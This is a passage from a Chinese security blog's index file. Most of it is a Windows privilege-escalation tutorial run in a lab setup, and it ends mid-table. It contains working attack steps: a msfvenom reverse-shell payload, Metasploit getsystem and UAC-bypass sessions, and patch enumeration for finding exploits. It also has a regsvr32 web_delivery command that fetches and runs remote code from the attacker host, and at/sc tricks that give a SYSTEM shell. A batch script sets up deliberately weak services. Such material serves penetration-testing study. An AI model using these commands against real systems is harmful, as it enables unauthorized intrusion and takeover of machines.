href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651102317&idx=1&sn=0b0a840bd30896eb28b02ac117700bad&chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect</a></p><p><a href="https://www.anquanke.com/post/id/87017">https://www.anquanke.com/post/id/87017</a></p><p><a href="https://www.freebuf.com/articles/system/176255.html">https://www.freebuf.com/articles/system/176255.html</a></p><p><a href="https://www.hackliu.com/?p=426">https://www.hackliu.com/?p=426</a></p><p><a href="https://blog.csdn.net/weixin_45116657/article/details/103176461">https://blog.csdn.net/weixin_45116657/article/details/103176461</a></p><p><a href="http://www.360doc.com/content/19/1122/23/25947829_874875535.shtml">http://www.360doc.com/content/19/1122/23/25947829_874875535.shtml</a></p><p>一些工具及资源地址：<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><p><a href="https://github.com/bonsaiviking/NfSpy">https://github.com/bonsaiviking/NfSpy</a></p><p><a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码相关操作进行提权 </tag>
            
            <tag> 计划任务 corn进行提权 </tag>
            
            <tag> 内核漏洞提权 </tag>
            
            <tag> 利用root权限运行的服务提权 </tag>
            
            <tag> sudo提权 </tag>
            
            <tag> suid提权     </tag>
            
            <tag> 利用可写文件提权 </tag>
            
            <tag> 劫持环境变量提权 </tag>
            
            <tag> 网络与隐藏服务提权 </tag>
            
            <tag> 通配符注入提权 </tag>
            
            <tag> NFS弱权限提权 </tag>
            
            <tag> &#39;.&#39;路径配置错误提权 </tag>
            
            <tag> mysql udf提权 </tag>
            
            <tag> 反弹shell </tag>
            
            <tag> 敏感组提权(docker) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows提权</title>
      <link href="/2020/10/01/windows%E6%8F%90%E6%9D%83/"/>
      <url>/2020/10/01/windows%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>本文介绍一些常见的Windows提权方法</p><span id="more"></span><h2 id="1-msf提权"><a href="#1-msf提权" class="headerlink" title="1.msf提权"></a>1.msf提权</h2><p>目标：windows 7 sp1 vl：192.168.8.53</p><p>攻击机：kali ：192.168.8.195</p><p>生成木马：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.195 lport=1234 -f exe &gt;1.exe</code></p><h3 id="1-直接提权"><a href="#1-直接提权" class="headerlink" title="1.直接提权"></a>1.直接提权</h3><p><code>getsystem</code>：在目标非管理员时候会失败</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br></pre></td></tr></table></figure><p>倘若成功可以使用<code>getuid</code>查看当前权限级别</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h3 id="2-bypassuac"><a href="#2-bypassuac" class="headerlink" title="2.bypassuac"></a>2.bypassuac</h3><p>倘若失败后就需要bypassuac了(但是尝试本次win7主机非管理员是失败的)</p><p><code>search bypassuac</code>（选用具体模块需要测试）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash">  Name                                                   Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                   ---------------  ----       -----  -----------</span><br><span class="line">   0   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2   exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3   exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6   exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)</span><br><span class="line">   7   exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   8   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br><span class="line">   9   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)</span><br><span class="line">   10  exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry</span><br></pre></td></tr></table></figure><p>选择一个excellent模块，需要设置一个新的session</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use exploit/windows/local/bypassuac_silentcleanup </span><br><span class="line">msf5 exploit(windows/local/bypassuac_silentcleanup) &gt; show options                             </span><br><span class="line">                                                                                               </span><br><span class="line">Module options (exploit/windows/local/bypassuac_silentcleanup):                                </span><br><span class="line">                                                                                               </span><br><span class="line">   Name       Current Setting                                          Required  Description   </span><br><span class="line">   ----       ---------------                                          --------  -----------   </span><br><span class="line">   PSH_PATH   %WINDIR%\System32\WindowsPowershell\v1.0\powershell.exe  yes       The path to the Powershell binary.</span><br><span class="line">   SESSION                                                             yes       The session to run this module on.</span><br><span class="line">   SLEEPTIME  0                                                        no        The time (ms) to sleep before running SilentCleanup                                                                                        </span><br><span class="line">                                                                                               </span><br><span class="line">                                                                                               </span><br><span class="line">Exploit target:                                                                                </span><br><span class="line">                                                                                               </span><br><span class="line">   Id  Name                                                                                    </span><br><span class="line">   --  ----</span><br><span class="line">   0   Microsoft Windows</span><br></pre></td></tr></table></figure><p>查看当前拥有的session</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/local/bypassuac_silentcleanup) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                            Connection</span><br><span class="line">  --  ----  ----                     -----------                            ----------</span><br><span class="line">  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-63U3JC89N2C  192.168.8.195:1234 -&gt; 192.168.8.57:49220 (192.168.8.57)</span><br></pre></td></tr></table></figure><p>设置session</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/local/bypassuac_silentcleanup) &gt; sessions -i 2</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>提权并查看权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><h2 id="2-漏洞提权"><a href="#2-漏洞提权" class="headerlink" title="2.漏洞提权"></a>2.漏洞提权</h2><h3 id="1-补丁查询"><a href="#1-补丁查询" class="headerlink" title="1.补丁查询"></a>1.补丁查询</h3><p><code>systeminfo</code>查看windows主机相关的补丁信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\administrator.MCITP\Desktop&gt;systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           WIN7</span><br><span class="line">OS 名称:          Microsoft Windows 7 专业版</span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          成员工作站</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:</span><br><span class="line">产品 ID:          00371-868-0000007-85264</span><br><span class="line">初始安装日期:     2020/10/26, 19:40:42</span><br><span class="line">系统启动时间:     2020/11/16, 9:02:47</span><br><span class="line">系统制造商:       VMware, Inc.</span><br><span class="line">系统型号:         VMware Virtual Platform</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 1 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 142 Stepping 10 Genu</span><br><span class="line">2 Mhz</span><br><span class="line">BIOS 版本:        Phoenix Technologies LTD 6.00, 2019/7/29</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     2,047 MB</span><br><span class="line">可用的物理内存:   1,418 MB</span><br><span class="line">虚拟内存: 最大值: 4,095 MB</span><br><span class="line">虚拟内存: 可用:   3,445 MB</span><br><span class="line">虚拟内存: 使用中: 650 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               MCITP.COM</span><br><span class="line">登录服务器:       \\WIN2012</span><br><span class="line">修补程序:         安装了 3 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB2999226</span><br><span class="line">                  [03]: KB976902</span><br><span class="line">网卡:             安装了 1 个 NIC。</span><br><span class="line">                  [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                      连接名:      本地连接</span><br><span class="line">                      启用 DHCP:   否</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 192.168.8.57</span><br><span class="line">                        [02]: </span><br><span class="line"></span><br><span class="line">C:\Users\administrator.MCITP\Desktop&gt;</span><br></pre></td></tr></table></figure><p>根据已打的补丁利用未打补丁的漏洞进行攻击</p><h3 id="2-Windows-Exploit-Suggester"><a href="#2-Windows-Exploit-Suggester" class="headerlink" title="2.Windows-Exploit-Suggester"></a>2.Windows-Exploit-Suggester</h3><p><a href="https://blog.csdn.net/weixin_45018333/article/details/109121732">https://blog.csdn.net/weixin_45018333/article/details/109121732</a></p><p>更新数据库<code>python  windows-exploit-suggester.py -u</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py -u</span><br><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[+] writing to file 2020-11-17-mssb.xls</span><br><span class="line">[*] done</span><br></pre></td></tr></table></figure><p>systeminfo &gt; win.txt获取目标主机的补丁情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha&gt;systeminfo &gt;win7.txt</span><br></pre></td></tr></table></figure><p><code>python windows-exploit-suggester.py -i win.txt -d 更新的数据库生成的表格</code>获取相应的可利用漏洞情况，这里只列举部分</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ython windows-exploit-suggester.py -i win.txt -d 2020-11-17-mssb.xls</span><br><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[*] database file detected as xls or xlsx based on extension</span><br><span class="line">[*] attempting to read from the systeminfo input file</span><br><span class="line">[+] systeminfo input file read successfully (GB2312)</span><br><span class="line">[*] querying database file for potential vulnerabilities</span><br><span class="line">[*] comparing the 168 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits</span><br><span class="line">[*] there are now 178 remaining vulns</span><br><span class="line">[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin</span><br><span class="line">[+] windows version identified as &#x27;Windows 7 SP1 64-bit&#x27;</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - &#x27;win32k.sys&#x27; &#x27;NtSetWindowLongPtr&#x27; Privilege Escalation (MS16-135) (2)</span><br><span class="line">[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-结合msf的windows补丁枚举模块"><a href="#3-结合msf的windows补丁枚举模块" class="headerlink" title="3.结合msf的windows补丁枚举模块"></a>3.结合msf的windows补丁枚举模块</h3><p><code>run post/windows/gather/enum_patches</code>查看目标的补丁信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /root/.msf4/loot/20201117220111_default_192.168.8.57_enum_patches_307247.txt</span><br><span class="line">[+] KB2534111 installed on 10/26/2020</span><br><span class="line">[+] KB2999226 installed on 10/26/2020</span><br><span class="line">[+] KB976902 installed on 11/21/2010</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>接下来就可以利用补丁情况去进行相应攻击</p><h2 id="3-CS提权"><a href="#3-CS提权" class="headerlink" title="3.CS提权"></a>3.CS提权</h2><p>cs和msf差不多，是一个图形化和命令行交互界面，支持扩展，msf也支持图形化(kage)，但用着不顺手。。。。但还是放几张cs进行提权的图吧。。</p><h3 id="1-getsystem-大多会失败"><a href="#1-getsystem-大多会失败" class="headerlink" title="1.getsystem(大多会失败)"></a>1.getsystem(大多会失败)</h3><p>这里就不放图了，主要是懒。。。。大致步骤如下</p><p>选中目标机直接在下面命令行交互栏中输入getsystem</p><h3 id="2-bypassuac-1"><a href="#2-bypassuac-1" class="headerlink" title="2.bypassuac"></a>2.bypassuac</h3><p>选中目标机—&gt;右键选择Access—&gt;Elevate—-&gt;Exploit选择uac-eventvwr</p><h3 id="3-漏洞提权"><a href="#3-漏洞提权" class="headerlink" title="3.漏洞提权"></a>3.漏洞提权</h3><p>同2bypassuac一样，只不过Exploit选择相应的ms模块</p><h2 id="4-命令提权"><a href="#4-命令提权" class="headerlink" title="4.命令提权"></a>4.命令提权</h2><h3 id="1-at命令（高版本中演变为schtasks-exe）"><a href="#1-at命令（高版本中演变为schtasks-exe）" class="headerlink" title="1.at命令（高版本中演变为schtasks.exe）"></a>1.at命令（高版本中演变为schtasks.exe）</h3><p>在win2000、win2003、winxp可以将其由administrator提升到system。</p><p>at发布的定时计划任务，win下默认以system权限运行，定时计划任务可以是批处理、二进制文件</p><p>语法：at  时间  命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;at 22:21 /interactive calc.exe</span><br><span class="line">新加了一项作业，其作业 ID = 2</span><br></pre></td></tr></table></figure><p>at结合msf</p><p>msf中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use exploit/multi/script/web_delivery</span><br><span class="line">[*] Using configured payload python/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; set lhost 192.168.8.75</span><br><span class="line">lhost =&gt; 192.168.8.75</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Python</span><br><span class="line">   1   PHP</span><br><span class="line">   2   PSH</span><br><span class="line">   3   Regsvr32</span><br><span class="line">   4   pubprn</span><br><span class="line">   5   PSH (Binary)</span><br><span class="line">   6   Linux</span><br><span class="line">   7   Mac OS X</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; set target 3</span><br><span class="line">target =&gt; 3</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; run</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.8.75:4444 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/bYakzIMD</span><br><span class="line">[*] Local IP: http://192.168.8.75:8080/bYakzIMD</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.8.75:8080/bYakzIMD.sct scrobj.dll</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; </span><br></pre></td></tr></table></figure><p>目标中（win2003）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;at 10:39 /interactive regsvr32 /s /n /</span><br><span class="line">/i:http://192.168.8.75:8080/bYakzIMD.sct scrobj.dll</span><br><span class="line">新加了一项作业，其作业 ID = 1</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator&gt;</span><br></pre></td></tr></table></figure><p>会出现问题，目前没有解决方案</p><p><img src="%5Cimages%5C1.png%5C" alt="q"></p><p>可以选择上线木马获取shell</p><p>目标中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;at 10:49 C:\Documents and Settings\Admin</span><br><span class="line">istrator\桌面\1.exe</span><br><span class="line">新加了一项作业，其作业 ID = 1</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator&gt;</span><br></pre></td></tr></table></figure><p>攻击机开启监听即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.8.75:1234 </span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.8.64</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.8.75:1234 -&gt; 192.168.8.64:1038) at 2020-11-18 10:50:50 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN2003\Administrator</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt;  </span><br></pre></td></tr></table></figure><h3 id="2-sc命令"><a href="#2-sc命令" class="headerlink" title="2.sc命令"></a>2.sc命令</h3><p>win7、03、8、08、12、16</p><p>sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中“服务”。</p><p><code>sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</code>创建一个名叫syscmd的新的交互式的cmd服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;sc Create syscmd binPath= &quot;cmd /K start&quot;</span><br><span class="line"> type= own type= interact</span><br><span class="line">[SC] CreateService 成功</span><br></pre></td></tr></table></figure><p>然后执行<code>sc start syscmd</code>，就弹出一个system权限的cmd环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure><h2 id="5-配置错误导致提权"><a href="#5-配置错误导致提权" class="headerlink" title="5.配置错误导致提权"></a>5.配置错误导致提权</h2><p>环境准备：目标：win10 1909 ：192.168.10.128</p><p>​攻击机：kali：192.168.8.75</p><p>先将以下保存为bat文件以管理员执行，目的是为了刚安装的虚拟机增加一些系统自启的高权限服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">echo [*] Create user lowuser</span><br><span class="line">net user lowuser lowuser1234 /add</span><br><span class="line">echo [*] Create directories for the binaryPath of our services</span><br><span class="line">mkdir &quot;C:\WeakServices\Weak Service 1&quot;</span><br><span class="line">mkdir &quot;C:\WeakServices\WeakService2&quot;</span><br><span class="line">mkdir &quot;C:\WeakServices\WeakService3&quot;</span><br><span class="line">mkdir &quot;C:\WeakServices\WeakService4&quot;</span><br><span class="line">echo [*] Use a default binary</span><br><span class="line">copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\Weak Service 1\service1.exe&quot;</span><br><span class="line">copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService2\service2.exe&quot;</span><br><span class="line">copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService3\service3.exe&quot;</span><br><span class="line">copy C:\Windows\System32\snmptrap.exe &quot;C:\WeakServices\WeakService4\service4.exe&quot;</span><br><span class="line">echo [*] settings 权</span><br><span class="line">icacls &quot;C:\WeakServices\Weak Service 1&quot; /deny lowuser:M</span><br><span class="line">icacls &quot;C:\WeakServices\WeakService3&quot; /deny lowuser:M</span><br><span class="line">icacls &quot;C:\WeakServices\WeakService4&quot; /deny lowuser:M</span><br><span class="line">echo [*] 四服务</span><br><span class="line">sc create WeakService1 displayName= &quot;Unquoted Service Path&quot; binPath= &quot;C:\WeakServices\Weak Service 1\service1.exe&quot; start= auto</span><br><span class="line">sc create WeakService2 displayName= &quot;Weak Folder Permissions&quot; binPath= &quot;C:\WeakServices\WeakService2\service2.exe&quot; start= auto</span><br><span class="line">sc create WeakService3 displayName= &quot;Weak Service Permissions&quot; binPath= &quot;C:\WeakServices\WeakService3\service3.exe&quot; obj= .\lowuser password= lowuser1234 start= auto</span><br><span class="line">sc create WeakService4 displayName= &quot;Weak Registry Permissions&quot; binPath= &quot;C:\WeakServices\WeakService4\service4.exe&quot; start= demand</span><br><span class="line">echo [*] Modifying WeakService3&#x27;s permissions</span><br><span class="line">sc sdset WeakService3 &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;DCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span><br></pre></td></tr></table></figure><p>成功后会增加一个lowuser，在C:\WeakServices\下增加4个文件夹，分别对应下面利用方式的一、二、三、四</p><figure class="highlight plaintext"><table><tr><td 